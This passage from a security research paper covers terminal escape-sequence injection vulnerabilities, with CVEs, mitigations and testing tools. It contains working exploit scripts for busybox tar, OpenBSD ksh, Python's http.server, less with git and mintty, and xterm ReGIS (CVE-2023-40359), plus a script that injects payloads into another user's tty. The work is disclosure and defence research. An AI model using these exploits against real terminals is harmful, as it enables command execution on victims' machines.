sequence like ESC &#34;/Z&#34; which can be used to output data.</p>
<p dir="auto">ESC &#34;/Z&#34; is a VT52 compatibility sequence that has the purpose of identifying
the version of the terminal and is almost certainly not used anymore. Given a
Unix shell will usually run a command based on the relative path if it contains
a &#34;/&#34; it is possible to do something like attack a user who happens to cd into
/tmp, or otherwise deliver a file.</p>
<p dir="auto">Here&#39;s an exploit for busybox tar:</p>
<pre><code>#!/bin/sh
# Busybox sh + tar, exploit, based on observation on oss-security:
# https://www.openwall.com/lists/oss-security/2021/05/17/1 (see the &#34;exercise
# for the reader&#34;)
# Note this doesn&#39;t use the &#34;newline&#34; embedding attack from rxvt, so the user
# has to press enter, but we mess up their terminal and put a &#34;;&#34; in the
# output, so if they type something other than ^C and/or press enter it works.
#
# David Leadbeater, 2022.

tmp=$(mktemp -d)
pushd $tmp

# rxvt-unicode and xterm -ti 100
mkdir -p 2c
echo &#34;touch /tmp/owned-by-tar &amp;&amp; printf &#39;\\e[31;43m -- Oh! look in /tmp --\\e[m\n&#39;&#34; &gt; 2c/&#34;Z[?1&#34;
chmod +x 2c/&#34;Z[?1&#34;

# xterm -ti 102
mkdir -p Z/ZcZ
ln -s ../../2c/&#34;Z[?1&#34; Z/ZcZ/Zc

# (Two terminals included just to demonstrate this does depend on the
# terminal&#39;s behaviour, but it&#39;s possible to target several via an escape that
# results in a response longer than busybox&#39;s sh&#39;s escape handling buffer.)

# Remove the &#34;\e30m&#34; to stop black text and see what&#39;s happening.
touch 2c/$(perl -e&#39;print &#34;\e[30m\e[c\e[?2l&#34;; print &#34;\eZ&#34; x 14; printf &#34;\e&lt;\e[A\e[c&#34;&#39;)
dd if=/dev/urandom of=2c/filler bs=1M count=100
touch 2c/$(perl -e&#39;print &#34;\e[A&#34;&#39;)

# order matters, to hide things. (no &#34;v&#34; to avoid messing up our terminal if
# run under busybox tar.)
tar cfz /tmp/busybox-tar-exploit.tgz 2c/*30* 2c/Z*1 Z/ZcZ/Zc 2c/filler 2c/*A*
popd
rm -rf &#34;$tmp&#34;

echo Now make the victim run: tar zxvf /tmp/busybox-tar-exploit.tgz
</code></pre>
<p dir="auto">In this case the victim is somehow social engineering into simply extracting a
tar archive under busybox tar, they will then find their terminal unresponsive
and maybe hit enter, running the attacker controlled command line. (Pressing
Control-C will abort the command, then the user has to know to blindly type
<code>reset</code>.)</p>
<p dir="auto">This exploit works for two reasons:</p>
<ul dir="auto">
<li>Busybox tar outputs raw escape characters (mentioned on oss-security as above in 2021, I sent the exploit to busybox authors too);</li>
<li>Busybox sh only has a short buffer for escape sequences, which if overflowed just writes the rest of the characters to the command line</li>
</ul>
<p dir="auto">Aside: some other tar implementations are vulnerable to similar, for example
OpenBSD&#39;s tar does not escape characters in error messages, so a tar archive
constructed carefully with overly long filenames can result in raw escape
sequences written to the screen (I reported this to OpenBSD, but it hasn&#39;t yet
been fixed).</p>
<p dir="auto">Another tool found to be vulnerable was OpenBSD&#39;s ksh. It did not escape output
in tab completion lists. I demonstrated an exploit for this in my DEF CON talk:</p>
<pre><code>#!/bin/sh
set -ex
cd /tmp

# A file, which has some escape sequences in its name
# - OSC 4;1 (set color of red, ensures following reports consistently what we want...)
# - OSC 4;1 (report color, gives us rgb:ffff/0000...., i.e. something with slashes)
# - Report DECSET (just to get a semicolon)
# - Make invisible
# - Hide cursor (makes it less obvious what&#39;s happening, maybe seems more like a bug...)
# - Make xterm report key presses (stops ^C)
set +x
touch &#34;$(printf &#39;\e]4;1;red\e\\\e]4;1;?\e\\\e[?$p\e[8m\e[?25l\e[&gt;4;2m&#39;)&#34;
set -x

# Make it work both if someone does cd /tmp/&lt;tab&gt;, or ls &lt;tab&gt; within /tmp
ln -sf /tmp 4

mkdir -p rgb:ffff/0000
cat &lt;&lt;&#39;EOF&#39; &gt; rgb:ffff/0000/000065535
printf &#39;\n\e[;31m\e#3Well hello &#39;$(uname -sr)
printf &#39;\n\e[;31m\e#4Well hello &#39;$(uname -sr)
echo
EOF
chmod +x rgb:ffff/0000/000065535

echo &#34;Now, do something like cd /tmp/&lt;tab&gt;&#34;
</code></pre>
<p dir="auto">In many ways this exploit is much like the tar exploit above, however it
contains an interesting escape sequence I&#39;d like to draw attention to, it
targets xterm and xterm has a way to turn control characters into escape
sequences. This means a user cannot simply press Control-C to cancel the
command, and may end up pressing keys, until they press the only key which
works, which happens to be Enter, running the attacker controlled command line
(if you are paranoid something like this has happened to you, the safest thing
to do is likely close the terminal).</p>
<h3 id="mitigating-echoback-vulnerabilities" dir="auto"><a href="#mitigating-echoback-vulnerabilities">Mitigating echoback vulnerabilities</a></h3>
<p dir="auto">I mentioned at the start of this paper that terminals &#34;emulate&#34; VT100 or later
devices. This is interesting because ANSI X3.64-1979 does not define what to do
in error conditions. However because most terminal emulators have claimed to be
compatible with VT100 they should reimplement the error conditions in a similar
way -- this has been documented in <a href="https://vt100.net/emu/dec_ansi_parser">https://vt100.net/emu/dec_ansi_parser</a></p>
<p dir="auto">To again draw a comparison with HTML, this is similar to how the HTML 5
specification defines how parsing should behave in the presence of invalid
characters (see <a href="https://html.spec.whatwg.org/multipage/parsing.html#the-input-byte-stream">&#34;Warning&#34; in
13.2.3</a>).</p>
<p dir="auto">HTML spec:</p>
<pre><code>The decoder algorithms describe how to handle invalid input; for security
reasons, it is imperative that those rules be followed precisely.
Differences in how invalid byte sequences are handled can result in,
amongst other problems, script injection vulnerabilities (&#34;XSS&#34;).
</code></pre>
<p dir="auto">Therefore, if terminal authors are reading this, please try to be exactly
compatible with VT100 parsing. For example, an OSC sequence (osc_string)
ignores control characters. (With one exception; do not implement C1 control
characters, they conflict with UTF-8 and the world doesn&#39;t use them anymore. See <a href="https://www.openwall.com/lists/oss-security/2015/09/20/1">this oss-security post from
2015</a> for more details.)</p>
<p dir="auto">If we reduce the chances of control characters being in escape sequences,
particularly replies, then shells can correctly handle replies (although there
will still be cases where a reply is partly read and so on returning to the
shell only the end of it will be seen, but a single response should not provide
enough for a successful attack).</p>
<p dir="auto">GNU readline has a &#34;skip-csi-sequence&#34; function, which is by default unbound. We
can set it up like so:</p>
<pre><code>bind &#39;&#34;\e[&#34;: skip-csi-sequence&#39;
</code></pre>
<p dir="auto">This provides some protection from unexpected input, however we also need to
implement &#34;skip-osc-sequence&#34; and &#34;skip-dcs-sequence&#34;. I have a patch for this.
TODO.</p>
<p dir="auto">With Zsh ZLE we can actually implement this ourselves:</p>
<pre><code>function skip-csi-sequence() {
  local key
  while read -sk key &amp;&amp; (( $((#key)) &lt; 0x40 || $((#key)) &gt; 0x7E )); do
    # empty body
  done
}

function skip-osc-sequence() {
  local key
  while read -sk key &amp;&amp; (( $((#key)) != 0x1B &amp;&amp; $((#key)) != 0x07 )); do
    # empty body
  done
  if [[ $((#key)) = 27 ]]; then
    # ^[\
    read -sk key
  fi
}

function skip-dcs-sequence() {
  local key
  while read -sk key &amp;&amp; (( $((#key)) != 0x1B )); do
    # empty body
  done
  if [[ $((#key)) = 27 ]]; then
    # ^[\
    read -sk key
  fi
}

zle -N skip-csi-sequence
zle -N skip-osc-sequence
zle -N skip-dcs-sequence
bindkey &#39;\e[&#39; skip-csi-sequence
bindkey &#39;\e]&#39; skip-osc-sequence
bindkey &#39;\eP&#39; skip-dcs-sequence
</code></pre>
<p dir="auto">Downside: Alt+P conflicts with DCS.</p>
<h2 id="exploitability" dir="auto"><a href="#exploitability">Exploitability</a></h2>
<p dir="auto">Often these terminal issues, while they are clearly serious, are not treated
with the severity a web browser bug or other issue that clearly is immediately
exposed to untrusted data.</p>
<p dir="auto">It should be remembered that a terminal does still deal with untrusted data,
even if there is another layer of defence that programs outputting to them
should escape data.</p>
<p dir="auto">These are some examples of potential exploit chains, using a tool that did not
correctly escape data.</p>
<h3 id="kubernetes" dir="auto"><a href="#kubernetes">Kubernetes</a></h3>
<p dir="auto">kubectl did not filter escape characters (<a href="https://nvd.nist.gov/vuln/detail/CVE-2021-25743">CVE-2021-25743</a>). This was
discovered by <a href="https://www.cyberark.com/resources/threat-research-blog/dont-trust-this-title-abusing-terminal-emulators-with-ansi-escape-characters">Evitar Gerzi</a>.  I discovered it&#39;s possible to abuse
without API access, i.e. write to <code>/dev/termination-log</code>.</p>
<p dir="auto">Interestingly Kubernetes did not consider this a serious issue and the CVE sat
unfixed for a while, so I fixed it after finding several terminal
vulnerabilities.</p>
<p dir="auto">There is a full PoC demo at <a href="https://github.com/dgl/houdini-kubectl-poc">https://github.com/dgl/houdini-kubectl-poc</a></p>
<iframe title="Windows Terminal CVE-2022-44702 and kubectl" width="500" height="281" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture;
web-share" allowfullscreen="" src="https://www.youtube-nocookie.com/embed/lpmn1yUeQbE?feature=oembed"></iframe>

<h3 id="local-http-server" dir="auto"><a href="#local-http-server">Local HTTP server</a></h3>
<p dir="auto">Again to call back to 2003, the scenario in HD Moore&#39;s paper is an administrator
running tail on their web logs. These days a more likely scenario is a user
running a command like <code>python3 -m http.server</code>.</p>
<p dir="auto">It turns out Python <a href="https://github.com/python/cpython/issues/100001">did not
escape</a> control characters
that it outputted in its http.server module.</p>
<p dir="auto">This allows several attacks, even if the terminal itself does not have a
vulnerability. The first one is hiding things in logs.</p>
<pre><code>printf &#34;GET /?\e]0; HTTP/1.0\r\n\r\n&#34; | nc localhost 8000
</code></pre>
<p dir="auto">Using the DECRQSS bug leads to something like:</p>
<pre><code>printf &#34;GET /?\ePqm\x3\e\\ \ePqm;ls;\e\\ \ePqm\r\e\\ HTTP/1.0\r\n\r\n&#34; | nc localhost 8000
</code></pre>
<iframe title="iTerm2 CVE-2022-45872 and Python 3 http.server" width="500" height="281" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture;
web-share" allowfullscreen="" src="https://www.youtube-nocookie.com/embed/_j8m7VMpjTY?feature=oembed"></iframe>

<p dir="auto">Other command line web server tooling may be vulnerable to similar, some I&#39;ve
reported it to don&#39;t even seem to consider it a security issue, but note
request spoofing or hiding is usually possible to some extent.</p>
<h3 id="reverse-ssh-shell" dir="auto"><a href="#reverse-ssh-shell">Reverse SSH shell</a></h3>
<p dir="auto">This exploit has the property that it does not need another vulnerable program
to get the escape characters to the user, it just uses Unix permissions.</p>
<p dir="auto">For this to work the attacker needs the ability to either run code as the user,
or root on the host they are SSHed to. It can then escape back to the host the
user SSHed from if there&#39;s a suitable terminal vulnerability (and the user
connected from a local shell, i.e. they typed <code>ssh host</code>, rather than invoking
SSH from a menu or similar).</p>
<p dir="auto">Clearly this needs a vulnerable terminal, rather than being an expected
possibility as SSH agent hijacking can be, if SSH jump boxes are used.</p>
<pre><code>#!/bin/bash
# Disconnect a user and attempt a terminal exploit on them
# David Leadbeater, 2023 &lt;https://dgl.cx/0bsd&gt;
pid=${1:?$&#39;\e&#39;&#34;[GUsage: $0 pid-of-shell&#34;}

tty=&#34;/dev/$(ps -otty -p$pid | tail -1)&#34;

kill -STOP $pid
printf &#39;\eP$q;xxx;open -a Calculator\r\e\\ \eP$qm\e\\&#39; &gt; $tty
kill -9 $pid
</code></pre>
<h3 id="less" dir="auto"><a href="#less">less</a></h3>
<p dir="auto">I found an issue in less where OSC 8 (hyperlink) was not terminated by anything
but a ^G (BEL) or ESC \ (ST), whereas most terminals take ESC and any character
as a terminating sequence (and should, per the VT100 state machine mentioned
elsewhere in this paper).</p>
<p dir="auto">The less author unfortunately patched this without a security release, so I
posted to <a href="https://www.openwall.com/lists/oss-security/2023/02/07/7">oss-security about
it</a>, when it was only
available as a patch.</p>
<p dir="auto">This can be combined with &#34;git&#34; to achieve RCE in a git repo. e.g. with mintty
which is default terminal on git for windows and had the DECRQSS bug.</p>
<p dir="auto">The exploit for less, git bash and mintty is to simply get a string like this
into a git commit message, then <code>git log</code> will open Calculator:</p>
<pre><code> ^[]8;;http://^[c^[P$qm q :;calc.exe;^M^[\
</code></pre>
<iframe title="git for Windows and mintty CVE-2022-47583 and less CVE-2022-46663" width="500" height="281" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media;
gyroscope; picture-in-picture; web-share" allowfullscreen="" src="https://www.youtube-nocookie.com/embed/l5LgxJionXc?feature=oembed"></iframe>
<h3 id="top" dir="auto"><a href="#top">top</a></h3>
<p dir="auto">It turns out some versions of Linux&#39;s top (procps) don&#39;t escape output. The top
authors have fixed in 4.x, but procps on many Linux distros is still 3.x.</p>
<img src="https://thewitchofendor.com/2023/09/top-color.png" width="500"/>
<p dir="auto">Top authors aren&#39;t hugely concerned because there&#39;s other ways to hide from
process tools on Linux (e.g. <a href="https://www.exploit-db.com/exploits/44806">CVE-2018-1121</a>).</p>
<p dir="auto">I demonstrated how to use a bug in xterm&#39;s ReGIS support to own someone running
<code>top</code> in <a href="https://youtu.be/Y4A7KMQEmfo?t=2435">my DEF CON talk</a>. ReGIS is a
vector graphics mode that happens to have a report command, it could be asked to set a particular name,
then report that name.</p>
<p dir="auto">The xterm bug is CVE-2023-40359 and was fixed in <a href="https://invisible-island.net/xterm/xterm.log.html#xterm_380">xterm
380</a>
&#34;pointer/overflow fixes&#34;.</p>
<p dir="auto">To exploit this requires running several processes, as a single line in top
cannot contain much data. It was easiest to arrange for the processes to
consume different amounts of memory, rather than carefully controlling CPU
usage.</p>
<details>
<summary>xterm CVE-2023-40359 exploit</summary>
<pre><code>#!/usr/bin/perl
# xterm CVE-2023-40359 exploit
# Run this, then run &#34;top -o RES&#34; in an xterm with ReGIS support (compiled with
# ReGIS and: xterm -ti 340).

sub mem_use {
  my $x = &#34;x&#34; x ($_[0] * 10*1024*1024);
  sleep 3600;
}

if (fork) {
  $0 = &#34;\ePpL(F&#39;x&#39;)\e\\&#34;;
  mem_use(120);
} elsif(fork) {
  $0 = &#34;\ePpL(A&#39;\x03&#39;)\e\\&#34;;
  mem_use(110);
} elsif(fork) {
  $0 = &#34;\ePpR(l)\e\\&#34;;
  mem_use(100);
} elsif(fork) {
  $0 = &#34;\ePpL(A&#39;\x7F=\&#34;/&#39;)\e\\&#34;;
  mem_use(90);
} elsif(fork) {
  $0 = &#34;\ePpR(l)\e\\&#34;;
  mem_use(80);
} elsif(fork) {
  $0 = &#34;\ePpL(A&#39;\x10\x7Ftm&#39;)\e\\&#34;;
  mem_use(70); 
} elsif (fork) {
  $0 = &#34;\ePpR(l)\e\\&#34;;
  mem_use(60);
} elsif(fork) {
  $0 = &#34;\ePpL(A&#39;\x10\x7Fp/&#39;)\e\\&#34;;
  mem_use(50);
} elsif(fork) {
  $0 = &#34;\ePpR(l)\e\\&#34;;
  mem_use(40);
} elsif(fork) {
  $0 = &#34;\ePpL(A&#39;\x10\x7F/x&#39;)\e\\&#34;;
  mem_use(30);
} elsif(fork) {
  $0 = &#34;\ePpR(l)\e\\&#34;;
  mem_use(20);
} elsif(fork) {
  $0 = &#34;\ePpL(A&#39;\x01\$\x05&#39;)\e\\&#34;;
  mem_use(10);
} else {
  $0 = &#34;\ePpR(l)\e\\&#34;;
  mem_use(5);
}
</code></pre>
</details>
<p dir="auto">Aside: busybox ps and top are also vulnerable to similar, I reported this but
they haven&#39;t been fixed yet.</p>
<h2 id="testing" dir="auto"><a href="#testing">Testing</a></h2>
<p dir="auto">One surprising outcome from this research was how variants of previous CVEs
existed in other terminals. To that end, I would like to make it easy for
anyone to test terminals against known terminal CVEs. I&#39;ve written a tool which
runs as an SSH server and runs some tests against terminals. I plan to collect
many more CVEs into this, so the code will serve as a collection of terminal
vulnerabilities.</p>
<p dir="auto">The tool is available at <a href="https://github.com/dgl/vt-houdini">https://github.com/dgl/vt-houdini</a>
or can be accessed via SSH: <code>ssh termtest.dgl.cx</code></p>
<p><a href="ssh://termtest.dgl.cx"><img width="500" src="https://thewitchofendor.com/2023/09/termtest.png" alt="A vulnerable version of iTerm2, being tested by
vt-houdini"/></a>
</p>
<h2 id="other-protections" dir="auto"><a href="#other-protections">Other protections</a></h2>
<p dir="auto">Tools like screen and tmux work by essentially emulating a terminal within your
terminal. You may think this provides a layer of isolation from your actual
terminal, however this is a false sense of security, screen has an escape
sequence to pass straight through to the actual terminal. Tmux also has an
escape sequence, but version 3.3 turns off allow-passthrough by default, so
tmux with allow-passthrough turned off does provide some protection. (There are
reasons to use passthrough, for example hterm provides a
<a href="https://chromium.googlesource.com/apps/libapps/+/refs/heads/main/hterm/etc/osc52.sh">script</a>
which can set the system clipboard from even within a screen session, as usual
security is a trade-off.)</p>
<p dir="auto">One interesting tool is mosh, which primarily exists to reduce latency of SSH
sessions, it does this by emulating a terminal on the server side and sending
diffs (and other tricks), rather than simply sending escape sequences over the wire.
As a result of this, its terminal implementation is fully isolated from the
terminal the user uses.</p>
<p dir="auto">Some terminals have options to disable potentially insecure escape sequences.
Often this is on by default and changing it will bring back some of the known
insecure sequences discussed here, so that is not recommended, but is
potentially useful for testing. (For example rxvt-unicode has an <code>-insecure</code>
option and if enabled <code>&#34;\e[7n&#34;</code> will reply with a response including a
newline.)</p>
<p dir="auto">iTerm2 has sensible defaults (it disables title reporting), but it also has an
advanced option to disable &#34;Potentially Insecure&#34; escape sequences. A paranoid
user may turn that on (for example that setting mitigated some of
<a href="https://blog.solidsnail.com/posts/2023-08-28-iterm2-rce">solid-snail&#39;s findings</a>).</p>
<h3 id="terminals-to-avoid" dir="auto"><a href="#terminals-to-avoid">Terminals to avoid</a></h3>
<p dir="auto">Sometimes software is beyond help. I do not recommend anyone uses
<a href="https://www.enlightenment.org/about-terminology.md">Terminology</a>. It is
vulnerable by default, but the author doesn&#39;t consider it a security issue,
based on someone else&#39;s report from 2015. See
<a href="https://git.enlightenment.org/enlightenment/terminology/commit/144e0b5068aa25b7fce822a94101586f374aa236">this commit</a></p>

<p>Additionally some terminals support C1 controls in UTF-8 encoded text, which per <a href="https://www.openwall.com/lists/oss-security/2015/09/20/1">this 2015 posting to
  oss-security</a> is problematic. Some terminals have the ability to turn this off, if they do not
such as Kitty I cannot recommend their use.</p>

<h2 id="summary" dir="auto"><a href="#summary">Summary</a></h2>
<p dir="auto">This research found quite simple variants of vulnerabilities from 2003 and
2008, as well as some novel new vulnerabilities and ways to exploit them.</p>
<p dir="auto">These vulnerabilities have the potential to be used in various kind of attacks,
but in particular given they can be used to attack developers and administrators they are of
particular relevance in securing the software supply chain. I believe by addressing and
understanding these issues we can help to make the software supply chain more secure.</p>
<p dir="auto">While this paper does include some unfixed issues I believe the most serious
bugs which could have been used for supply chain attacks are addressed and disclosing all this can
help make the open source world a safer place.</p>
<h3 id="cves-found" dir="auto"><a href="#cves-found">CVEs found</a></h3>
<ul dir="auto">
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-45872">CVE-2022-45872</a> - iTerm2 DECRQSS</li>
<li><a href="https://github.com/microsoft/terminal/releases/tag/v1.15.2874.0">CVE-2022-44702</a> - Windows Terminal + WSL working directory</li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-47583">CVE-2022-47583</a> - mintty DECRQSS</li>
<li><a href="https://www.openwall.com/lists/oss-security/2022/11/10/1">CVE-2022-45063</a> - xterm OSC 50</li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-46387">CVE-2022-46387</a> - ConEmu Title</li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-39150">CVE-2023-39150</a> - ConEmu Title Take 2</li>
<li><a href="https://www.openwall.com/lists/oss-security/2022/12/05/1">CVE-2022-4170</a> - rxvt-unicode background</li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-23465">CVE-2022-23465</a> - SwiftTerm DECRQSS</li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-46663">CVE-2022-46663</a> - less OSC 8</li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-39726">CVE-2023-39726</a> - mintty OSC 50</li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-40359">CVE-2023-40359</a> - xterm ReGIS</li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-40216">CVE-2023-40216</a> - OpenBSD wscons parameter overflow</li>
</ul>
<h2 id="talks" dir="auto"><a href="#talks">Talks</a></h2>
<ul dir="auto">
<li><a href="https://www.youtube.com/watch?v=iIHw0KWgzAs">BlueHat 2023</a>: &#34;Houdini of the Terminal: From Kubernetes to RCE&#34;</li>
<li><a href="https://www.youtube.com/watch?v=4kfDBNzStbs">Everything Open 2023</a>: &#34;Houdini of the Terminal: The need for escaping&#34;</li>
<li><a href="https://www.youtube.com/watch?v=Y4A7KMQEmfo">DEF CON 31</a>: &#34;Terminally Owned - 60 years of escaping&#34;</li>
</ul>
<h2 id="credits-and-thanks" dir="auto"><a href="#credits-and-thanks">Credits and thanks</a></h2>
<p>Thanks to everyone who has previously researched these issues, especially <a href="https://hdm.io">HD Moore</a> for the 2003 research, <a href="https://twitter.com/g3rzi">Evitar Gerzi</a> for finding the kubectl issue
originally and <a href="https://www.stokfredrik.com/">STÖK</a>
for <a href="https://www.youtube.com/watch?v=3T2Al3jdY38">presenting this in an engaging way</a> and finding yet more attack
vectors.</p>
<p dir="auto">Thank you to all the terminal authors for fixing the bugs I found and in some
cases adding extra hardening.</p>
<p dir="auto">Thanks to <a href="https://opensource.gresearch.com">G-Research Open Source</a> for letting
me research this all.</p>
<h2 id="references" dir="auto"><a href="#references">References</a></h2>
<p dir="auto">Key citations:</p>
<ul dir="auto">
<li>HD Moore, 2003, <a href="https://marc.info/?l=bugtraq&amp;m=104612710031920&amp;w=2">&#34;Terminal Emulator Security Issues&#34;</a></li>
<li>Eviatar Gerzi, 2022; <a href="https://www.cyberark.com/resources/threat-research-blog/dont-trust-this-title-abusing-terminal-emulators-with-ansi-escape-characters">&#34;Don&#39;t Trust This Title: Abusing Terminal Emulators with ANSI Escape Characters&#34;</a></li>
<li>Phrack, 1994, <a href="http://phrack.org/issues/46/4.html">#46 file 4</a> &#34;Line Noise&#34; - flash.c</li>
<li>Mitre; CWE-150; <a href="https://cwe.mitre.org/data/definitions/150.html">https://cwe.mitre.org/data/definitions/150.html</a></li>
<li>Paul Szabo, 2008, <a href="http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=510030">CVE-2008-2383</a></li>
</ul>
<p dir="auto">Other interesting sources:</p>
<ul dir="auto">
<li>Nicholas Boucher and Ross Anderson, 2021, &#34;Trojan Source: Invisible Vulnerabilities&#34;; <a href="https://trojansource.codes/">https://trojansource.codes/</a></li>
<li>Thomas Dickey, 2023, &#34;XTerm Control Sequences&#34;; <a href="https://invisible-island.net/xterm/ctlseqs/ctlseqs.html">https://invisible-island.net/xterm/ctlseqs/ctlseqs.html</a></li>
<li>Bob Bemer, &#34;That Powerful ESCAPE Character&#34;, <a href="https://web.archive.org/web/20010411103243/http://www.bobbemer.com/ESCAPE.HTM">https://web.archive.org/web/20010411103243/http://www.bobbemer.com/ESCAPE.HTM</a></li>
<li>Lear Siegler, 1979, &#34;ADM-3A Operator&#39;s Manual&#34;; <a href="https://vt100.net/lsi/adm3a-om.pdf">https://vt100.net/lsi/adm3a-om.pdf</a></li>
<li>Digital Equipment Corporation, 1994, &#34;VT520/VT525 Video Terminal Programmer Information&#34;; <a href="http://web.mit.edu/dosathena/doc/www/ek-vt520-rm.pdf">http://web.mit.edu/dosathena/doc/www/ek-vt520-rm.pdf</a></li>
<li>Paul Flo Williams, &#34;A parser for DEC&#39;s ANSI-compatible video terminals.&#34; VT100.net; <a href="https://vt100.net/emu/dec_ansi_parser">https://vt100.net/emu/dec_ansi_parser</a></li>
<li>Konstantinos Foutzopoulos, 2021, &#34;Sixel for terminal graphics&#34;; <a href="https://konfou.xyz/posts/sixel-for-terminal-graphics/">https://konfou.xyz/posts/sixel-for-terminal-graphics/</a></li>
<li>Unicode Consortium, Mark Davis et al., 2014; Unicode Technical Report #36; <a href="https://unicode.org/reports/tr36/">https://unicode.org/reports/tr36/</a></li>
<li>Unicode Consortium, Robin Leroy, et al., 2023; Unicode Technical Standard #55; <a href="https://www.unicode.org/reports/tr55/">https://www.unicode.org/reports/tr55/</a></li>
</ul>
</article>
      </div>
      
    </div></div>
  </body>
</html>
